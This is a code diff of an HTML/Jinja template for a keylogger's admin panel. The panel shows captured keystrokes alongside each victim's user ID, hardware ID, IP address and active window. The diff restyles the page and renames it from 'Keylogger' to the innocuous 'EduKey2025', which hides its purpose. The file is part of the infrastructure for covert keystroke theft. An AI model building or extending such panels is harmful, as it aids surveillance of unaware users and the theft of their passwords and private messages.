@@ -1,28 +1,77 @@
 <!DOCTYPE html>
 <html lang="sk">
 <head>
-    <meta charset="UTF-8" />
-    <title>Admin panel</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>EduKey2025 Admin Panel</title>
+<style>
+    body {
+        background-color: #000;
+        color: #33ff33;
+        font-family: "Courier New", Courier, monospace;
+        margin: 0;
+        padding: 1rem;
+    }
+    h1 {
+        text-align: center;
+        text-shadow: 0 0 5px #33ff33;
+    }
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 1rem;
+        font-size: 0.9rem;
+    }
+    th, td {
+        border: 1px solid #33ff33;
+        padding: 0.5rem;
+        text-align: left;
+    }
+    th {
+        background-color: #003300;
+    }
+    tr:nth-child(even) {
+        background-color: #001a00;
+    }
+    a.logout {
+        display: block;
+        margin-bottom: 1rem;
+        color: #33ff33;
+        text-decoration: none;
+        font-weight: bold;
+        text-align: right;
+    }
+    a.logout:hover {
+        text-decoration: underline;
+    }
+</style>
 </head>
 <body>
-    <h1>Keylogger - Admin panel</h1>
-    <table border="1" cellpadding="5" cellspacing="0">
-        <tr>
-            <th>Čas</th>
-            <th>User ID</th>
-            <th>HWID</th>
-            <th>Aktívne okno</th>
-            <th>Stlačené klávesy</th>
-        </tr>
-        {% for entry in data %}
-        <tr>
-            <td>{{ entry['timestamp'] }}</td>
-            <td>{{ entry['user_id'] }}</td>
-            <td>{{ entry['hwid'] }}</td>
-            <td>{{ entry['window'] }}</td>
-            <td>{{ entry['keys'] }}</td>
-        </tr>
-        {% endfor %}
+    <a href="{{ url_for('logout') }}" class="logout">Odhlásiť sa</a>
+    <h1>EduKey2025 - Admin panel</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Timestamp</th>
+                <th>User ID</th>
+                <th>HWID</th>
+                <th>IP Address</th>
+                <th>Keys</th>
+                <th>Window</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for entry in data %}
+            <tr>
+                <td>{{ entry.timestamp }}</td>
+                <td>{{ entry.user_id or "N/A" }}</td>
+                <td>{{ entry.hwid or "N/A" }}</td>
+                <td>{{ entry.ip_address or "N/A" }}</td>
+                <td style="white-space: pre-wrap;">{{ entry.keys or "N/A" }}</td>
+                <td>{{ entry.window or "N/A" }}</td>
+            </tr>
+            {% endfor %}
+        </tbody>
     </table>
 </body>
 </html>
